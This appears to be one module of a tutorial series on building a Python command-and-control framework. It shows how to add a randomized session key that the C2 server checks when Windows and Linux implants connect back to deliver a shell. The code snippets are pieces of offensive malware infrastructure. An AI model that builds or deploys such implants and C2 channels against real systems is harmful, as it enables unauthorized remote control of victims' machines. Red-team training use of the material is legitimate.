# Securing Your Payload Channels

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M03Q2JN)

This module covers the addition of a basic, randomized key generation that conducts a check when the payload connects to the C2 server.

## Randomized Key Generation and Implementation

At the beginning of your main function in the `sockserver.py` file, add the following, which will generate a random 12-character string value and print the output.

### sockserver.py
```
    ran_payload_key = (''.join(random.choices(string.ascii_lowercase, k=12)))
    print(f'[+] Key for this session is {ran_payload_key}')
```

We need a way to update our payloads with the `ran_payload_key` value. In order to do so, we will write the `ran_payload_key` values to the payload files. 
This can be added after the `with open` for the 'INPUT_PORT_HERE` value. For simplicity, I'm including the `with open` statement for one payload. 

```
    with open(file_name) as f:
        new_key = f.read().replace('INPUT_KEY_HERE', ran_payload_key)
    with open(file_name, 'w') as f:
        f.write(new_key)
        f.close()
```

Finally, we need a way to check for the key on the server-side. Scroll up to the `comm_handler()` function, and add the following after the `remote_target, remote_ip = sock.accept()`
line. What we are doing is handling some basic incoming traffic that we will generate in our payloads to receive a variable
called `key_check`, and then decode it as normal. 


```
            key_check = remote_target.recv(1024).decode()
            key_check = base64.b64decode(key_check).decode()
```

Additionally, we need to wrap everything after this in an if statement. This will compare the received payload key with the one set as a variable. If the key matches, then the `comm_handler()`
will continue, otherwise it closes the socket.
```
            if key_check == ran_payload_key:
            //-- previous code already here and indented properly--/
            else:
                remote_target.close()
```

### winplant.py, linplant.py

We only have to make a couple of modifications to our payloads, and the modifications are the exact same. After the `sock.connect((host_ip, host_port))` method, we add a new variable called
`key_check = "INPUT_KEY_HERE"`, call the outbound function by adding `outbound(key_check)`, and then adding a short sleep so that the server has time to process it.

```
        key_check = "INPUT_KEY_HERE"
        outbound(key_check)
        time.sleep(.5)
```

## Notes
If everything is configured correctly, you should still receive your shell as normal. If it is not working, you could add print statements with everything we changed, and try to troubleshoot
where the disconnect is in the traffic. You can also increase the `time.sleep()` update to see if it has a positive effect.
